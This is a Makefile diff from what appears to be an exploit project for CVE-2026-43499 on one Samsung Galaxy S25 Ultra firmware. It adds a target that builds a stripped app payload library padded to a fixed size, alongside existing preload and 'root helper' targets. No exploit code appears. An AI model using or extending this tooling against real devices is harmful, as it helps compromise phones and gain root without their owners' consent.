@@ -10,6 +10,8 @@ endif
 
 PRELOAD := $(OUTDIR)/cve-2026-43499
 APP_PRELOAD := $(OUTDIR)/cve-2026-43499-app.so
+APP_RELEASE := $(OUTDIR)/cve-2026-43499-app.release.so
+APP_RELEASE_SIZE := 104128
 ROOT_HELPER := $(OUTDIR)/cve-2026-43499-root
 
 PRELOAD_SRCS := \
@@ -37,9 +39,11 @@ COMMON_CFLAGS := \
 
 .DEFAULT_GOAL := all
 
-.PHONY: all clean info
+.PHONY: all clean info release
 
 all: $(PRELOAD) $(APP_PRELOAD) $(ROOT_HELPER)
+
+release: $(APP_RELEASE)
 
 $(OUTDIR):
 	mkdir -p $@
@@ -55,11 +59,22 @@ $(APP_PRELOAD): $(APP_PRELOAD_SRCS) $(TARGET_HEADER) src/offset.h src/common.h s
 	$(TARGET_CC) -DAPP_PAYLOAD=1 -fPIC $(COMMON_CFLAGS) $(APP_PRELOAD_SRCS) \
 	  -shared -pthread -o $@
 
+$(APP_RELEASE): $(APP_PRELOAD_SRCS) $(TARGET_HEADER) src/offset.h src/common.h src/kernelsnitch/*.h | $(OUTDIR)
+	$(TARGET_CC) -DAPP_PAYLOAD=1 -fPIC -Oz -g0 \
+	  -fno-unwind-tables -fno-asynchronous-unwind-tables \
+	  -ffunction-sections -fdata-sections \
+	  -Wall -Wextra -Wno-unused-parameter -Wno-sign-compare -Isrc \
+	  $(APP_PRELOAD_SRCS) -shared -pthread \
+	  -Wl,--gc-sections -Wl,--icf=all -s -o $@
+	@test $$(stat -c %s $@) -le $(APP_RELEASE_SIZE)
+	truncate -s $(APP_RELEASE_SIZE) $@
+
 info:
 	@echo "TARGET=Samsung Galaxy S25 Ultra SM-S938N S938NKSUACZF1"
 	@echo "TARGET_CC=$(TARGET_CC)"
 	@echo "PRELOAD=$(PRELOAD)"
 	@echo "APP_PRELOAD=$(APP_PRELOAD)"
+	@echo "APP_RELEASE=$(APP_RELEASE)"
 	@echo "ROOT_HELPER=$(ROOT_HELPER)"
 
 clean:
